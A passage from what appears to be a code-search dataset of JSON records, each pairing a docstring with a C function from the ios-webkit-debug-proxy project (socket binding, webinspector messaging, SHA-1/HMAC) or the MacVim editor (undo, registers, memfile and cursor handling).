ht_put(iport_ht, iport->device_id, iport);\n  }\n  iport->self = self;\n\n  // listen for browser clients\n  int s_fd = -1;\n  if (port > 0) {\n    s_fd = self->listen(self, port);\n  }\n  if (s_fd < 0 && (min_port > 0 && max_port >= min_port)) {\n    iwdp_iport_t *iports = (iwdp_iport_t *)ht_values(iport_ht);\n    int p;\n    for (p = min_port; p <= max_port; p++) {\n      bool is_taken = false;\n      iwdp_iport_t *ipp;\n      for (ipp = iports; *ipp; ipp++) {\n        if ((*ipp)->port == p) {\n          is_taken = true;\n          break;\n        }\n      }\n      if (!is_taken && p != port) {\n        s_fd = self->listen(self, p);\n        if (s_fd > 0) {\n          port = p;\n          break;\n        }\n      }\n    }\n    free(iports);\n  }\n  if (s_fd < 0) {\n    return self->on_error(self, \"Unable to bind %s on port %d-%d\",\n        (device_id ? device_id : \"\\\"devices list\\\"\"),\n        min_port, max_port);\n  }\n  if (self->add_fd(self, s_fd, NULL, iport, true)) {\n    return self->on_error(self, \"add_fd s_fd=%d failed\", s_fd);\n  }\n  iport->s_fd = s_fd;\n  iport->port = port;\n  if (!device_id) {\n    iwdp_log_connect(iport);\n  }\n  return DL_SUCCESS;\n}", "path": "ios-webkit-debug-proxy/src/ios_webkit_debug_proxy.c", "commit_date": "2019-10-07 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "//\n// webinspector\n//\n", "func_signal": "wi_status iwdp_send_packet(wi_t wi, const char *packet, size_t length)", "code": "{\n  iwdp_iwi_t iwi = (iwdp_iwi_t)wi->state;\n  iwdp_t self = iwi->iport->self;\n  return (self->send(self, iwi->wi_fd, packet, length) ?\n      self->on_error(self, \"Unable to send %zd bytes to inspector\", length) :\n      WI_SUCCESS);\n}", "path": "ios-webkit-debug-proxy/src/ios_webkit_debug_proxy.c", "commit_date": "2019-10-07 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "/*\n   WIRFinalMessageKey\n   __selector\n   __argument\n */\n", "func_signal": "wi_status wi_send_plist(wi_t self, plist_t rpc_dict)", "code": "{\n  wi_private_t my = self->private_state;\n  char *rpc_bin = NULL;\n  uint32_t rpc_len = 0;\n  plist_to_bin(rpc_dict, &rpc_bin, &rpc_len);\n  // if our message is <8k, we'll send a single final_msg,\n  // otherwise we'll send <8k partial_msg \"chunks\" then a final_msg \"chunk\"\n  wi_status ret = WI_ERROR;\n  uint32_t i;\n  for (i = 0; ; i += MAX_RPC_LEN) {\n    bool is_partial = false;\n    char *data = NULL;\n    uint32_t data_len = 0;\n    if (!my->partials_supported) {\n      data = rpc_bin;\n      data_len = rpc_len;\n      rpc_bin = NULL;\n    } else {\n      is_partial = (rpc_len - i > MAX_RPC_LEN);\n      plist_t wi_dict = plist_new_dict();\n      plist_t wi_rpc = plist_new_data(rpc_bin + i,\n          (is_partial ? MAX_RPC_LEN : rpc_len - i));\n      plist_dict_set_item(wi_dict,\n          (is_partial ? \"WIRPartialMessageKey\" : \"WIRFinalMessageKey\"), wi_rpc);\n      plist_to_bin(wi_dict, &data, &data_len);\n      plist_free(wi_dict);\n      wi_dict = NULL;\n      wi_rpc = NULL; // freed by wi_dict\n      if (!data) {\n        break;\n      }\n    }\n\n    size_t length = data_len + 4;\n    char *out_head = (char*)malloc(length * sizeof(char));\n    if (!out_head) {\n      if (my->partials_supported) {\n        free(data);\n      }\n      break;\n    }\n    char *out_tail = out_head;\n\n    // write big-endian int\n    *out_tail++ = ((data_len >> 24) & 0xFF);\n    *out_tail++ = ((data_len >> 16) & 0xFF);\n    *out_tail++ = ((data_len >> 8) & 0xFF);\n    *out_tail++ = (data_len & 0xFF);\n\n    // write data\n    memcpy(out_tail, data, data_len);\n    free(data);\n\n    wi_on_debug(self, \"wi.send_packet\", out_head, length);\n    wi_status not_sent = self->send_packet(self, out_head, length);\n    free(out_head);\n    if (not_sent) {\n      break;\n    }\n\n    if (!is_partial) {\n      ret = WI_SUCCESS;\n      break;\n    }\n  }\n  free(rpc_bin);\n  return ret;\n}", "path": "ios-webkit-debug-proxy/src/webinspector.c", "commit_date": "2020-10-02 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "/*\n * output = SHA-1( file contents )\n */\n", "func_signal": "int sha1_file( const char *path, unsigned char output[20] )", "code": "{\n    FILE *f;\n    size_t n;\n    sha1_context ctx;\n    unsigned char buf[1024];\n\n    if( ( f = fopen( path, \"rb\" ) ) == NULL )\n        return( POLARSSL_ERR_SHA1_FILE_IO_ERROR );\n\n    sha1_starts( &ctx );\n\n    while( ( n = fread( buf, 1, sizeof( buf ), f ) ) > 0 )\n        sha1_update( &ctx, buf, n );\n\n    sha1_finish( &ctx, output );\n\n    memset( &ctx, 0, sizeof( sha1_context ) );\n\n    if( ferror( f ) != 0 )\n    {\n        fclose( f );\n        return( POLARSSL_ERR_SHA1_FILE_IO_ERROR );\n    }\n\n    fclose( f );\n    return( 0 );\n}", "path": "ios-webkit-debug-proxy/src/sha1.c", "commit_date": "2017-04-09 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "//\n// socket I/O\n//\n", "func_signal": "iwdp_status iwdp_iport_accept(iwdp_t self, iwdp_iport_t iport, int ws_fd,\n    iwdp_iws_t *to_iws)", "code": "{\n  iwdp_iws_t iws = iwdp_iws_new(self->is_debug);\n  iws->iport = iport;\n  iws->ws_fd = ws_fd;\n  rpc_new_uuid(&iws->ws_id);\n  ht_put(iport->ws_id_to_iws, iws->ws_id, iws);\n  *to_iws = iws;\n  return IWDP_SUCCESS;\n}", "path": "ios-webkit-debug-proxy/src/ios_webkit_debug_proxy.c", "commit_date": "2019-10-07 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "/*\n * SHA-1 final digest\n */\n", "func_signal": "void sha1_finish( sha1_context *ctx, unsigned char output[20] )", "code": "{\n    uint32_t last, padn;\n    uint32_t high, low;\n    unsigned char msglen[8];\n\n    high = ( ctx->total[0] >> 29 )\n         | ( ctx->total[1] <<  3 );\n    low  = ( ctx->total[0] <<  3 );\n\n    PUT_UINT32_BE( high, msglen, 0 );\n    PUT_UINT32_BE( low,  msglen, 4 );\n\n    last = ctx->total[0] & 0x3F;\n    padn = ( last < 56 ) ? ( 56 - last ) : ( 120 - last );\n\n    sha1_update( ctx, (unsigned char *) sha1_padding, padn );\n    sha1_update( ctx, msglen, 8 );\n\n    PUT_UINT32_BE( ctx->state[0], output,  0 );\n    PUT_UINT32_BE( ctx->state[1], output,  4 );\n    PUT_UINT32_BE( ctx->state[2], output,  8 );\n    PUT_UINT32_BE( ctx->state[3], output, 12 );\n    PUT_UINT32_BE( ctx->state[4], output, 16 );\n}", "path": "ios-webkit-debug-proxy/src/sha1.c", "commit_date": "2017-04-09 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "/*\n * Checkup routine\n */\n", "func_signal": "int sha1_self_test( int verbose )", "code": "{\n    int i, j, buflen;\n    unsigned char buf[1024];\n    unsigned char sha1sum[20];\n    sha1_context ctx;\n\n    /*\n     * SHA-1\n     */\n    for( i = 0; i < 3; i++ )\n    {\n        if( verbose != 0 )\n            printf( \"  SHA-1 test #%d: \", i + 1 );\n\n        sha1_starts( &ctx );\n\n        if( i == 2 )\n        {\n            memset( buf, 'a', buflen = 1000 );\n\n            for( j = 0; j < 1000; j++ )\n                sha1_update( &ctx, buf, buflen );\n        }\n        else\n            sha1_update( &ctx, sha1_test_buf[i],\n                               sha1_test_buflen[i] );\n\n        sha1_finish( &ctx, sha1sum );\n\n        if( memcmp( sha1sum, sha1_test_sum[i], 20 ) != 0 )\n        {\n            if( verbose != 0 )\n                printf( \"failed\\n\" );\n\n            return( 1 );\n        }\n\n        if( verbose != 0 )\n            printf( \"passed\\n\" );\n    }\n\n    if( verbose != 0 )\n        printf( \"\\n\" );\n\n    for( i = 0; i < 7; i++ )\n    {\n        if( verbose != 0 )\n            printf( \"  HMAC-SHA-1 test #%d: \", i + 1 );\n\n        if( i == 5 || i == 6 )\n        {\n            memset( buf, '\\xAA', buflen = 80 );\n            sha1_hmac_starts( &ctx, buf, buflen );\n        }\n        else\n            sha1_hmac_starts( &ctx, sha1_hmac_test_key[i],\n                                    sha1_hmac_test_keylen[i] );\n\n        sha1_hmac_update( &ctx, sha1_hmac_test_buf[i],\n                                sha1_hmac_test_buflen[i] );\n\n        sha1_hmac_finish( &ctx, sha1sum );\n\n        buflen = ( i == 4 ) ? 12 : 20;\n\n        if( memcmp( sha1sum, sha1_hmac_test_sum[i], buflen ) != 0 )\n        {\n            if( verbose != 0 )\n                printf( \"failed\\n\" );\n\n            return( 1 );\n        }\n\n        if( verbose != 0 )\n            printf( \"passed\\n\" );\n    }\n\n    if( verbose != 0 )\n        printf( \"\\n\" );\n\n    return( 0 );\n}", "path": "ios-webkit-debug-proxy/src/sha1.c", "commit_date": "2017-04-09 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "//\n// STRUCTS\n//\n", "func_signal": "void wi_private_free(wi_private_t my)", "code": "{\n  if (my) {\n    cb_free(my->in);\n    cb_free(my->partial);\n    memset(my, 0, sizeof(struct wi_private));\n    free(my);\n  }\n}", "path": "ios-webkit-debug-proxy/src/webinspector.c", "commit_date": "2020-10-02 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "/*\n * SHA-1 context setup\n */\n", "func_signal": "void sha1_starts( sha1_context *ctx )", "code": "{\n    ctx->total[0] = 0;\n    ctx->total[1] = 0;\n\n    ctx->state[0] = 0x67452301;\n    ctx->state[1] = 0xEFCDAB89;\n    ctx->state[2] = 0x98BADCFE;\n    ctx->state[3] = 0x10325476;\n    ctx->state[4] = 0xC3D2E1F0;\n}", "path": "ios-webkit-debug-proxy/src/sha1.c", "commit_date": "2017-04-09 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "//\n// logging\n//\n", "func_signal": "iwdp_status iwdp_on_error(iwdp_t self, const char *format, ...)", "code": "{\n  va_list args;\n  va_start(args, format);\n  vfprintf(stderr, format, args);\n  fprintf(stderr, \"\\n\");\n  va_end(args);\n  return IWDP_ERROR;\n}", "path": "ios-webkit-debug-proxy/src/ios_webkit_debug_proxy.c", "commit_date": "2019-10-07 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "//\n// websocket\n//\n", "func_signal": "ws_status iwdp_send_data(ws_t ws, const char *data, size_t length)", "code": "{\n  iwdp_iws_t iws = (iwdp_iws_t)ws->state;\n  iwdp_t self = iws->iport->self;\n  return (self->send(self, iws->ws_fd, data, length) ?\n      ws->on_error(ws, \"Unable to send %zd bytes of data\", length) :\n      WS_SUCCESS);\n}", "path": "ios-webkit-debug-proxy/src/ios_webkit_debug_proxy.c", "commit_date": "2019-10-07 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "/*\n * SHA-1 process buffer\n */\n", "func_signal": "void sha1_update( sha1_context *ctx, const unsigned char *input, size_t ilen )", "code": "{\n    size_t fill;\n    uint32_t left;\n\n    if( ilen <= 0 )\n        return;\n\n    left = ctx->total[0] & 0x3F;\n    fill = 64 - left;\n\n    ctx->total[0] += (uint32_t) ilen;\n    ctx->total[0] &= 0xFFFFFFFF;\n\n    if( ctx->total[0] < (uint32_t) ilen )\n        ctx->total[1]++;\n\n    if( left && ilen >= fill )\n    {\n        memcpy( (void *) (ctx->buffer + left),\n                (void *) input, fill );\n        sha1_process( ctx, ctx->buffer );\n        input += fill;\n        ilen  -= fill;\n        left = 0;\n    }\n\n    while( ilen >= 64 )\n    {\n        sha1_process( ctx, input );\n        input += 64;\n        ilen  -= 64;\n    }\n\n    if( ilen > 0 )\n    {\n        memcpy( (void *) (ctx->buffer + left),\n                (void *) input, ilen );\n    }\n}", "path": "ios-webkit-debug-proxy/src/sha1.c", "commit_date": "2017-04-09 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "/*\n * SHA1 HMAC context reset\n */\n", "func_signal": "void sha1_hmac_reset( sha1_context *ctx )", "code": "{\n    sha1_starts( ctx );\n    sha1_update( ctx, ctx->ipad, 64 );\n}", "path": "ios-webkit-debug-proxy/src/sha1.c", "commit_date": "2017-04-09 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "//\n// STRUCTS\n//\n", "func_signal": "void iwdp_free(iwdp_t self)", "code": "{\n  if (self) {\n    iwdp_private_t my = self->private_state;\n    if (my) {\n      ht_free(my->device_id_to_iport);\n      free(my->frontend);\n      free(my->sim_wi_socket_addr);\n      memset(my, 0, sizeof(struct iwdp_private));\n      free(my);\n    }\n    memset(self, 0, sizeof(struct iwdp_struct));\n    free(self);\n  }\n}", "path": "ios-webkit-debug-proxy/src/ios_webkit_debug_proxy.c", "commit_date": "2019-10-07 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "/*\n * SHA-1 HMAC context setup\n */\n", "func_signal": "void sha1_hmac_starts( sha1_context *ctx, const unsigned char *key, size_t keylen )", "code": "{\n    size_t i;\n    unsigned char sum[20];\n\n    if( keylen > 64 )\n    {\n        sha1( key, keylen, sum );\n        keylen = 20;\n        key = sum;\n    }\n\n    memset( ctx->ipad, 0x36, 64 );\n    memset( ctx->opad, 0x5C, 64 );\n\n    for( i = 0; i < keylen; i++ )\n    {\n        ctx->ipad[i] = (unsigned char)( ctx->ipad[i] ^ key[i] );\n        ctx->opad[i] = (unsigned char)( ctx->opad[i] ^ key[i] );\n    }\n\n    sha1_starts( ctx );\n    sha1_update( ctx, ctx->ipad, 64 );\n\n    memset( sum, 0, sizeof( sum ) );\n}", "path": "ios-webkit-debug-proxy/src/sha1.c", "commit_date": "2017-04-09 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "/*\n * SHA-1 HMAC final digest\n */\n", "func_signal": "void sha1_hmac_finish( sha1_context *ctx, unsigned char output[20] )", "code": "{\n    unsigned char tmpbuf[20];\n\n    sha1_finish( ctx, tmpbuf );\n    sha1_starts( ctx );\n    sha1_update( ctx, ctx->opad, 64 );\n    sha1_update( ctx, tmpbuf, 20 );\n    sha1_finish( ctx, output );\n\n    memset( tmpbuf, 0, sizeof( tmpbuf ) );\n}", "path": "ios-webkit-debug-proxy/src/sha1.c", "commit_date": "2017-04-09 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "/*\n * Escape string value for json output\n */\n", "func_signal": "char *iwdp_escape_json_string_val(const char *str)", "code": "{\n  int len = strlen(str);\n  char* res = (char*)malloc(len * 6 + 1);\n\n  int i, j;\n  for (i = 0, j = 0; i < len; i++, j++) {\n    if (str[i] >= 0 && str[i] < 32) {\n      sprintf(res + j, \"\\\\u%04d\", str[i]);\n      j += 5;\n    } else {\n      if (str[i] == '\"' || str[i] == '\\\\') {\n        res[j++] = '\\\\';\n      }\n      res[j] = str[i];\n    }\n  }\n  res[j] = '\\0';\n\n  return res;\n}", "path": "ios-webkit-debug-proxy/src/ios_webkit_debug_proxy.c", "commit_date": "2019-10-07 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "/*!\n * @result compare by page_num\n */\n", "func_signal": "int iwdp_ipage_cmp(const void *a, const void *b)", "code": "{\n  const iwdp_ipage_t ipa = *((iwdp_ipage_t *)a);\n  const iwdp_ipage_t ipb = *((iwdp_ipage_t *)b);\n  if (ipa == ipb || !ipa || !ipb) {\n    return (ipa == ipb ? 0 : ipa ? -1 : 1);\n  }\n  uint32_t pna = ipa->page_num;\n  uint32_t pnb = ipb->page_num;\n  return (pna == pnb ? 0 : pna < pnb ? -1 : 1);\n}", "path": "ios-webkit-debug-proxy/src/ios_webkit_debug_proxy.c", "commit_date": "2019-10-07 00:00:00", "repo_name": "google/ios-webkit-debug-proxy", "stars": 5844, "license": "bsd-3-clause", "language": "c", "size": 674}
{"docstring": "/*\n * Destroys text converters\n */\n", "func_signal": "void\nmac_conv_cleanup()", "code": "{\n    if (gUTF16ToUTF8Converter)\n    {\n\tTECDisposeConverter(gUTF16ToUTF8Converter);\n\tgUTF16ToUTF8Converter = NULL;\n    }\n\n    if (gPathConverter)\n    {\n\tTECDisposeConverter(gPathConverter);\n\tgPathConverter = NULL;\n    }\n}", "path": "macvim/src/os_mac_conv.c", "commit_date": "2011-10-20 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/*\n * Get an expression for the \"\\\"=expr1\" or \"CTRL-R =expr1\"\n * Returns '=' when OK, NUL otherwise.\n */\n", "func_signal": "int\nget_expr_register()", "code": "{\n    char_u\t*new_line;\n\n    new_line = getcmdline('=', 0L, 0);\n    if (new_line == NULL)\n\treturn NUL;\n    if (*new_line == NUL)\t/* use previous line */\n\tvim_free(new_line);\n    else\n\tset_expr_line(new_line);\n    return '=';\n}", "path": "macvim/src/ops.c", "commit_date": "2014-06-25 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/*\n * Get the result of the '=' register expression.\n * Returns a pointer to allocated memory, or NULL for failure.\n */\n", "func_signal": "char_u *\nget_expr_line()", "code": "{\n    char_u\t*expr_copy;\n    char_u\t*rv;\n    static int\tnested = 0;\n\n    if (expr_line == NULL)\n\treturn NULL;\n\n    /* Make a copy of the expression, because evaluating it may cause it to be\n     * changed. */\n    expr_copy = vim_strsave(expr_line);\n    if (expr_copy == NULL)\n\treturn NULL;\n\n    /* When we are invoked recursively limit the evaluation to 10 levels.\n     * Then return the string as-is. */\n    if (nested >= 10)\n\treturn expr_copy;\n\n    ++nested;\n    rv = eval_to_string(expr_copy, NULL, TRUE);\n    --nested;\n    vim_free(expr_copy);\n    return rv;\n}", "path": "macvim/src/ops.c", "commit_date": "2014-06-25 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/*\n * release as many blocks as possible\n * Used in case of out of memory\n *\n * return TRUE if any memory was released\n */\n", "func_signal": "int\nmf_release_all()", "code": "{\n    buf_T\t*buf;\n    memfile_T\t*mfp;\n    bhdr_T\t*hp;\n    int\t\tretval = FALSE;\n\n    for (buf = firstbuf; buf != NULL; buf = buf->b_next)\n    {\n\tmfp = buf->b_ml.ml_mfp;\n\tif (mfp != NULL)\n\t{\n\t    /* If no swap file yet, may open one */\n\t    if (mfp->mf_fd < 0 && buf->b_may_swap)\n\t\tml_open_file(buf);\n\n\t    /* only if there is a swapfile */\n\t    if (mfp->mf_fd >= 0)\n\t    {\n\t\tfor (hp = mfp->mf_used_last; hp != NULL; )\n\t\t{\n\t\t    if (!(hp->bh_flags & BH_LOCKED)\n\t\t\t    && (!(hp->bh_flags & BH_DIRTY)\n\t\t\t\t|| mf_write(mfp, hp) != FAIL))\n\t\t    {\n\t\t\tmf_rem_used(mfp, hp);\n\t\t\tmf_rem_hash(mfp, hp);\n\t\t\tmf_free_bhdr(hp);\n\t\t\thp = mfp->mf_used_last;\t/* re-start, list was changed */\n\t\t\tretval = TRUE;\n\t\t    }\n\t\t    else\n\t\t\thp = hp->bh_prev;\n\t\t}\n\t    }\n\t}\n    }\n    return retval;\n}", "path": "macvim/src/memfile.c", "commit_date": "2014-04-02 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/*\n * Get pointer to last added entry.\n * If it's not valid, give an error message and return NULL.\n */\n", "func_signal": "static u_entry_T *\nu_get_headentry()", "code": "{\n    if (curbuf->b_u_newhead == NULL || curbuf->b_u_newhead->uh_entry == NULL)\n    {\n\tEMSG(_(\"E439: undo list corrupt\"));\n\treturn NULL;\n    }\n    return curbuf->b_u_newhead->uh_entry;\n}", "path": "macvim/src/undo.c", "commit_date": "2014-04-20 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/*\n * Sets LANG environment variable in Vim from Mac locale\n */\n", "func_signal": "void\nmac_lang_init()", "code": "{\n    if (mch_getenv((char_u *)\"LANG\") == NULL)\n    {\n\tchar\tbuf[20];\n\tif (LocaleRefGetPartString(NULL,\n\t\t    kLocaleLanguageMask | kLocaleLanguageVariantMask |\n\t\t    kLocaleRegionMask | kLocaleRegionVariantMask,\n\t\t    sizeof buf, buf) == noErr && *buf)\n\t{\n\t    vim_setenv((char_u *)\"LANG\", (char_u *)buf);\n#   ifdef HAVE_LOCALE_H\n\t    setlocale(LC_ALL, \"\");\n#   endif\n\t}\n    }\n}", "path": "macvim/src/os_mac_conv.c", "commit_date": "2011-10-20 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/*\n * Return TRUE when undo is allowed.  Otherwise give an error message and\n * return FALSE.\n */\n", "func_signal": "int\nundo_allowed()", "code": "{\n    /* Don't allow changes when 'modifiable' is off.  */\n    if (!curbuf->b_p_ma)\n    {\n\tEMSG(_(e_modifiable));\n\treturn FALSE;\n    }\n\n#ifdef HAVE_SANDBOX\n    /* In the sandbox it's not allowed to change the text. */\n    if (sandbox != 0)\n    {\n\tEMSG(_(e_sandbox));\n\treturn FALSE;\n    }\n#endif\n\n    /* Don't allow changes in the buffer while editing the cmdline.  The\n     * caller of getcmdline() may get confused. */\n    if (textlock != 0)\n    {\n\tEMSG(_(e_secure));\n\treturn FALSE;\n    }\n\n    return TRUE;\n}", "path": "macvim/src/undo.c", "commit_date": "2014-04-20 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/*\n * When the cursor is on the NUL past the end of the line and it should not be\n * there move it left.\n */\n", "func_signal": "void\nadjust_cursor_eol()", "code": "{\n    if (curwin->w_cursor.col > 0\n\t    && gchar_cursor() == NUL\n#ifdef FEAT_VIRTUALEDIT\n\t    && (ve_flags & VE_ONEMORE) == 0\n#endif\n\t    && !(restart_edit || (State & INSERT)))\n    {\n\t/* Put the cursor on the last character in the line. */\n\tdec_cursor();\n\n#ifdef FEAT_VIRTUALEDIT\n\tif (ve_flags == VE_ALL)\n\t{\n\t    colnr_T\t    scol, ecol;\n\n\t    /* Coladd is set to the width of the last character. */\n\t    getvcol(curwin, &curwin->w_cursor, &scol, NULL, &ecol);\n\t    curwin->w_cursor.coladd = ecol - scol + 1;\n\t}\n#endif\n    }\n}", "path": "macvim/src/ops.c", "commit_date": "2014-06-25 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/*\n * After reloading a buffer which was saved for 'undoreload': Find the first\n * line that was changed and set the cursor there.\n */\n", "func_signal": "void\nu_find_first_changed()", "code": "{\n    u_header_T\t*uhp = curbuf->b_u_newhead;\n    u_entry_T   *uep;\n    linenr_T\tlnum;\n\n    if (curbuf->b_u_curhead != NULL || uhp == NULL)\n\treturn;  /* undid something in an autocmd? */\n\n    /* Check that the last undo block was for the whole file. */\n    uep = uhp->uh_entry;\n    if (uep->ue_top != 0 || uep->ue_bot != 0)\n\treturn;\n\n    for (lnum = 1; lnum < curbuf->b_ml.ml_line_count\n\t\t\t\t\t      && lnum <= uep->ue_size; ++lnum)\n\tif (STRCMP(ml_get_buf(curbuf, lnum, FALSE),\n\t\t\t\t\t\tuep->ue_array[lnum - 1]) != 0)\n\t{\n\t    clearpos(&(uhp->uh_cursor));\n\t    uhp->uh_cursor.lnum = lnum;\n\t    return;\n\t}\n    if (curbuf->b_ml.ml_line_count != uep->ue_size)\n    {\n\t/* lines added or deleted at the end, put the cursor there */\n\tclearpos(&(uhp->uh_cursor));\n\tuhp->uh_cursor.lnum = lnum;\n    }\n}", "path": "macvim/src/undo.c", "commit_date": "2014-04-20 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/*\n * Return TRUE if lines starting with '#' should be left aligned.\n */\n", "func_signal": "int\npreprocs_left()", "code": "{\n    return\n# ifdef FEAT_SMARTINDENT\n#  ifdef FEAT_CINDENT\n\t(curbuf->b_p_si && !curbuf->b_p_cin) ||\n#  else\n\tcurbuf->b_p_si\n#  endif\n# endif\n# ifdef FEAT_CINDENT\n\t(curbuf->b_p_cin && in_cinkeys('#', ' ', TRUE)\n\t\t\t\t\t   && curbuf->b_ind_hash_comment == 0)\n# endif\n\t;\n}", "path": "macvim/src/ops.c", "commit_date": "2014-06-25 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/*\n * Implementation of the \"U\" command.\n * Differentiation from vi: \"U\" can be undone with the next \"U\".\n * We also allow the cursor to be in another line.\n * Careful: may trigger autocommands that reload the buffer.\n */\n", "func_signal": "void\nu_undoline()", "code": "{\n    colnr_T t;\n    char_u  *oldp;\n\n    if (undo_off)\n\treturn;\n\n    if (curbuf->b_u_line_ptr == NULL\n\t\t\t|| curbuf->b_u_line_lnum > curbuf->b_ml.ml_line_count)\n    {\n\tbeep_flush();\n\treturn;\n    }\n\n    /* first save the line for the 'u' command */\n    if (u_savecommon(curbuf->b_u_line_lnum - 1,\n\t\t       curbuf->b_u_line_lnum + 1, (linenr_T)0, FALSE) == FAIL)\n\treturn;\n    oldp = u_save_line(curbuf->b_u_line_lnum);\n    if (oldp == NULL)\n    {\n\tdo_outofmem_msg((long_u)0);\n\treturn;\n    }\n    ml_replace(curbuf->b_u_line_lnum, curbuf->b_u_line_ptr, TRUE);\n    changed_bytes(curbuf->b_u_line_lnum, 0);\n    vim_free(curbuf->b_u_line_ptr);\n    curbuf->b_u_line_ptr = oldp;\n\n    t = curbuf->b_u_line_colnr;\n    if (curwin->w_cursor.lnum == curbuf->b_u_line_lnum)\n\tcurbuf->b_u_line_colnr = curwin->w_cursor.col;\n    curwin->w_cursor.col = t;\n    curwin->w_cursor.lnum = curbuf->b_u_line_lnum;\n    check_cursor_col();\n}", "path": "macvim/src/undo.c", "commit_date": "2014-04-20 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/*\n * clear the line saved for the \"U\" command\n * (this is used externally for crossing a line while in insert mode)\n */\n", "func_signal": "void\nu_clearline()", "code": "{\n    if (curbuf->b_u_line_ptr != NULL)\n    {\n\tvim_free(curbuf->b_u_line_ptr);\n\tcurbuf->b_u_line_ptr = NULL;\n\tcurbuf->b_u_line_lnum = 0;\n    }\n}", "path": "macvim/src/undo.c", "commit_date": "2014-04-20 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/*\n * Give some info about the position of the cursor (for \"g CTRL-G\").\n * In Visual mode, give some info about the selected region.  (In this case,\n * the *_count_cursor variables store running totals for the selection.)\n */\n", "func_signal": "void\ncursor_pos_info()", "code": "{\n    char_u\t*p;\n    char_u\tbuf1[50];\n    char_u\tbuf2[40];\n    linenr_T\tlnum;\n    long\tbyte_count = 0;\n    long\tbyte_count_cursor = 0;\n    long\tchar_count = 0;\n    long\tchar_count_cursor = 0;\n    long\tword_count = 0;\n    long\tword_count_cursor = 0;\n    int\t\teol_size;\n    long\tlast_check = 100000L;\n    long\tline_count_selected = 0;\n    pos_T\tmin_pos, max_pos;\n    oparg_T\toparg;\n    struct block_def\tbd;\n\n    /*\n     * Compute the length of the file in characters.\n     */\n    if (curbuf->b_ml.ml_flags & ML_EMPTY)\n    {\n\tMSG(_(no_lines_msg));\n    }\n    else\n    {\n\tif (get_fileformat(curbuf) == EOL_DOS)\n\t    eol_size = 2;\n\telse\n\t    eol_size = 1;\n\n\tif (VIsual_active)\n\t{\n\t    if (lt(VIsual, curwin->w_cursor))\n\t    {\n\t\tmin_pos = VIsual;\n\t\tmax_pos = curwin->w_cursor;\n\t    }\n\t    else\n\t    {\n\t\tmin_pos = curwin->w_cursor;\n\t\tmax_pos = VIsual;\n\t    }\n\t    if (*p_sel == 'e' && max_pos.col > 0)\n\t\t--max_pos.col;\n\n\t    if (VIsual_mode == Ctrl_V)\n\t    {\n#ifdef FEAT_LINEBREAK\n\t\tchar_u * saved_sbr = p_sbr;\n\n\t\t/* Make 'sbr' empty for a moment to get the correct size. */\n\t\tp_sbr = empty_option;\n#endif\n\t\toparg.is_VIsual = 1;\n\t\toparg.block_mode = TRUE;\n\t\toparg.op_type = OP_NOP;\n\t\tgetvcols(curwin, &min_pos, &max_pos,\n\t\t\t\t\t  &oparg.start_vcol, &oparg.end_vcol);\n#ifdef FEAT_LINEBREAK\n\t\tp_sbr = saved_sbr;\n#endif\n\t\tif (curwin->w_curswant == MAXCOL)\n\t\t    oparg.end_vcol = 